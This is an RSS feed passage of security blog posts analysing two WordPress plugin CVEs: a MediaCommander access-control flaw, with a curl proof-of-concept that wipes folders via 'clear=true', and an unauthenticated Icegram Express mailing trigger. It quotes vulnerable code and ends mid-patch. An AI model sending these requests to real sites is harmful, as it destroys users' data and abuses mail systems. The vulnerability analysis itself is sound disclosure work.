&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with Author account&lt;/li&gt;&#xA;&lt;li&gt;Retrieve the &lt;code&gt;nonce&lt;/code&gt; from the response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;310&#34; width=&#34;926&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send request with the &lt;code&gt;X-WP-Nonce&lt;/code&gt; header set to the &lt;code&gt;nonce&lt;/code&gt; value from the response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-json/mediacommander/v1/import-csv&amp;#34; \&#xA;  -H &amp;#34;Cookie: Author cookie&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 7323b67e07&amp;#34; \&#xA;  -F &amp;#34;file=@./file.csv&amp;#34; \&#xA;  -F &amp;#34;clear=true&amp;#34; \&#xA;  -F &amp;#34;attachments=false&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-14508 shows that the plugin &lt;strong&gt;MediaCommander ≤ 2.3.1&lt;/strong&gt; allows &lt;strong&gt;Author or higher users&lt;/strong&gt; to perform &lt;strong&gt;full folder deletion&lt;/strong&gt; of other users via the REST API &lt;code&gt;import-csv&lt;/code&gt;. The root cause is &lt;strong&gt;missing proper capability checks&lt;/strong&gt; for destructive actions. Patch &lt;strong&gt;2.4.0&lt;/strong&gt; fixes this by raising the capability check to &lt;strong&gt;Administrator&lt;/strong&gt; (&lt;code&gt;manage_options&lt;/code&gt;), preventing unauthorized deletion.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always assign capabilities according to the risk level of the action (destructive actions should be Administrator only).&lt;/li&gt;&#xA;&lt;li&gt;Capability checks in REST API must match the nature of the operation, not just basic rights like &lt;code&gt;upload_files&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Parameters like &lt;code&gt;clear&lt;/code&gt; can cause &lt;strong&gt;total data loss&lt;/strong&gt;, so handle carefully and combine with proper capability checks.&lt;/li&gt;&#xA;&lt;li&gt;Correct use of nonce and cookies cannot compensate for &lt;strong&gt;broken access control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mediacommander/vulnerability/wordpress-mediacommander-plugin-2-3-1-missing-authorization-to-authenticated-author-media-folder-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin &amp;lt;= 2.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12349 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-14-cve-2025-12349/</link>
      <pubDate>Sun, 14 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-14-cve-2025-12349/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-14-cve-2025-12349/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Icegram Express – Email Subscribers, Newsletters and Marketing Automation&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; is affected by an &lt;strong&gt;Authorization vulnerability&lt;/strong&gt; in versions &lt;strong&gt;up to and including 5.9.10&lt;/strong&gt;. The root cause is that the plugin &lt;strong&gt;does not properly validate user permissions&lt;/strong&gt; when performing actions in the &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt; function.&#xA;This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;force the system to send emails immediately&lt;/strong&gt;, &lt;strong&gt;bypass the sending schedule&lt;/strong&gt;, &lt;strong&gt;increase server load&lt;/strong&gt;, and &lt;strong&gt;modify the plugin’s state&lt;/strong&gt; (for example: &lt;strong&gt;&lt;code&gt;last-cron-hit&lt;/code&gt;&lt;/strong&gt;), thereby &lt;strong&gt;enabling abuse or DoS-like effects&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12349&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12349&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.9.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.9.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/email-subscribers/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Email Subscribers &amp;amp; Newsletters&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.10&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.11&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following &lt;strong&gt;action hook&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending&amp;#39;,&#xA;    array( $this, &amp;#39;trigger_mailing_queue_sending&amp;#39; )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt; hook is a mechanism that allows &lt;strong&gt;all users&lt;/strong&gt;, including &lt;strong&gt;unauthenticated users&lt;/strong&gt;, to access WordPress &lt;strong&gt;AJAX endpoints&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, when accessing the endpoint &lt;strong&gt;&lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt;&lt;/strong&gt; with the parameter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress will &lt;strong&gt;directly invoke the callback&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt; &lt;strong&gt;without any authentication or authorization checks&lt;/strong&gt;, allowing &lt;strong&gt;anyone&lt;/strong&gt; to trigger the &lt;strong&gt;email sending cron logic&lt;/strong&gt;, &lt;strong&gt;bypass the schedule&lt;/strong&gt;, and &lt;strong&gt;modify the internal state of the plugin&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending()&lt;/code&gt;&lt;/strong&gt; function is responsible for &lt;strong&gt;triggering the plugin’s email sending cron process&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;First, the function checks the cron &lt;strong&gt;lock&lt;/strong&gt; status via &lt;strong&gt;&lt;code&gt;ES()-&amp;gt;cron-&amp;gt;is_locked()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If the cron &lt;strong&gt;is locked&lt;/strong&gt;, the function &lt;strong&gt;does nothing&lt;/strong&gt;, preventing multiple email-sending processes from running concurrently.&lt;/li&gt;&#xA;&lt;li&gt;If the cron &lt;strong&gt;is not locked&lt;/strong&gt;, the function calls &lt;strong&gt;&lt;code&gt;do_action( &#39;ig_es_cron_worker&#39; )&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Two callbacks are registered for the &lt;code&gt;ig_es_cron_worker&lt;/code&gt; action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_campaigns&amp;#39; ), 10 );&#xA;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_queue&amp;#39; ), 30 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This hook invokes callbacks based on priority: &lt;code&gt;process_campaigns()&lt;/code&gt; runs first and &lt;code&gt;process_queue()&lt;/code&gt; runs afterward.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_campaigns() {&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    // ...&#xA;    $es_c_croncount = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $es_c_croncount &amp;gt; 0 ) {&#xA;&#xA;        // ...&#xA;        $notification = ES_DB_Mailing_Queue::get_notification_to_be_sent( $campaign_hash );&#xA;        $notification_guid = isset( $notification[&amp;#39;hash&amp;#39;] ) ? $notification[&amp;#39;hash&amp;#39;] : null;&#xA;        $campaign_id = isset( $notification[&amp;#39;campaign_id&amp;#39;] ) ? $notification[&amp;#39;campaign_id&amp;#39;] : 0;&#xA;&#xA;        // ...&#xA;&#xA;        if ( ! is_null( $notification_guid ) ) {&#xA;&#xA;            $cron_job = &amp;#39;ig_es_cron_worker&amp;#39;;&#xA;&#xA;            // ...&#xA;            if ( ! $this-&amp;gt;is_cron_job_locked( $cron_job ) ) {&#xA;&#xA;                $locking_status = $this-&amp;gt;lock_cron_job( $cron_job );&#xA;                if ( &amp;#39;locked&amp;#39; === $locking_status ) {&#xA;&#xA;                    // ...&#xA;                    ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sending&amp;#39; );&#xA;&#xA;                    // ...&#xA;                    $emails_data = ES_DB_Sending_Queue::get_emails_to_be_sent_by_hash(&#xA;                        $notification_guid,&#xA;                        $es_c_croncount&#xA;                    );&#xA;&#xA;                    if ( count( $emails_data ) &amp;gt; 0 ) {&#xA;&#xA;                        // ...&#xA;                        ES()-&amp;gt;mailer-&amp;gt;send(&#xA;                            $notification[&amp;#39;subject&amp;#39;],&#xA;                            $notification[&amp;#39;body&amp;#39;],&#xA;                            array_column( $emails_data, &amp;#39;email&amp;#39; ),&#xA;                            array( &amp;#39;guid&amp;#39; =&amp;gt; $notification_guid )&#xA;                        );&#xA;&#xA;                        // ...&#xA;                        if ( ES_DB_Sending_Queue::get_total_emails_to_be_sent_by_hash( $notification_guid ) === 0 ) {&#xA;                            ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sent&amp;#39; );&#xA;                        }&#xA;&#xA;                        // ...&#xA;                    }&#xA;&#xA;                    $this-&amp;gt;unlock_cron_job( $cron_job );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;process_campaigns()&lt;/code&gt; function:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Unlocks the cron if needed and updates the cron execution timestamp.&lt;/li&gt;&#xA;&lt;li&gt;Retrieves the &lt;strong&gt;maximum number of emails&lt;/strong&gt; that can be sent in a single run.&lt;/li&gt;&#xA;&lt;li&gt;Retrieves &lt;strong&gt;pending campaigns&lt;/strong&gt; from &lt;code&gt;ig_es_mailing_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Checks and &lt;strong&gt;locks the cron job&lt;/strong&gt; to prevent concurrent execution.&lt;/li&gt;&#xA;&lt;li&gt;Updates the campaign status to &lt;strong&gt;&lt;code&gt;Sending&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Retrieves the list of emails to be sent based on the &lt;strong&gt;batch size&lt;/strong&gt; from &lt;code&gt;ig_es_sending_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Performs &lt;strong&gt;bulk email sending&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If all emails have been sent, updates the campaign status to &lt;strong&gt;&lt;code&gt;Sent&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Finally, &lt;strong&gt;unlocks the cron job&lt;/strong&gt; to allow subsequent runs.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_queue() {&#xA;&#xA;    global $wpdb;&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    $email_sending_limit = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $email_sending_limit &amp;gt; 0 ) {&#xA;&#xA;        $micro_time = microtime( true );&#xA;&#xA;        ...&#xA;        $notifications = $wpdb-&amp;gt;get_results(&#xA;            ...&#xA;        );&#xA;&#xA;        $batch_start_time = time();&#xA;&#xA;        if ( is_array( $notifications ) &amp;amp;&amp;amp; count( $notifications ) &amp;gt; 0 ) {&#xA;&#xA;            ...&#xA;            $contacts = ES()-&amp;gt;contacts_db-&amp;gt;get_details_by_ids( $contact_ids );&#xA;&#xA;            foreach ( $campaigns_notifications as $campaign_id =&amp;gt; $notifications ) {&#xA;&#xA;                ...&#xA;&#xA;                foreach ( $notifications as $notification ) {&#xA;&#xA;                    ...&#xA;&#xA;                    if ( &amp;#39;optin_confirmation&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } elseif ( &amp;#39;optin_welcome_email&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } else {&#xA;                        ...&#xA;                    }&#xA;&#xA;                    $email_sending_limit--;&#xA;&#xA;                    if ( $email_sent ) {&#xA;                        $this-&amp;gt;db-&amp;gt;delete_from_queue( $campaign_id, $contact_id );&#xA;                    }&#xA;&#xA;                    if (&#xA;                        $email_sending_limit &amp;lt;= 0 ||&#xA;                        IG_ES_Background_Process_Helper::time_exceeded( $batch_start_time, 0.8 ) ||&#xA;                        IG_ES_Background_Process_Helper::memory_exceeded()&#xA;                    ) {&#xA;                        break 2;&#xA;                    }&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;process_queue()&lt;/code&gt; function:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Checks and unlocks the cron if needed, then updates the last cron run timestamp.&lt;/li&gt;&#xA;&lt;li&gt;Determines the maximum number of emails that can be sent in a single execution.&lt;/li&gt;&#xA;&lt;li&gt;Queries the &lt;code&gt;ig_queue&lt;/code&gt; table to retrieve emails that are due to be sent but have not yet been sent.&lt;/li&gt;&#xA;&lt;li&gt;Groups records by &lt;code&gt;campaign_id&lt;/code&gt; and retrieves corresponding contact information.&lt;/li&gt;&#xA;&lt;li&gt;For each contact in the queue, determines the email type and sends the appropriate email.&lt;/li&gt;&#xA;&lt;li&gt;If sending is successful, removes the corresponding record from the queue.&lt;/li&gt;&#xA;&lt;li&gt;Stops processing when the sending limit is reached, execution time is nearly exhausted, or memory limits are exceeded.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises because no capability or permission checks are performed.&lt;/strong&gt;&#xA;The handler is attached to the &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt; hook, allowing &lt;strong&gt;unauthenticated users&lt;/strong&gt; to directly call the AJAX endpoint. When the callback is executed, the code &lt;strong&gt;does not check user permissions&lt;/strong&gt; and &lt;strong&gt;does not verify a nonce&lt;/strong&gt;, allowing &lt;strong&gt;anyone&lt;/strong&gt; to trigger internal logic (email sending cron), &lt;strong&gt;bypass scheduling&lt;/strong&gt;, and &lt;strong&gt;modify system state&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v5.9.11)&lt;/strong&gt; fixes the vulnerability by &lt;strong&gt;adding access control and request validation&lt;/strong&gt; before allowing the email sending cron to be triggered.&lt;/p&gt;&#xA;&lt;p&gt;public function trigger_mailing_queue_sending() {&#xA;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math 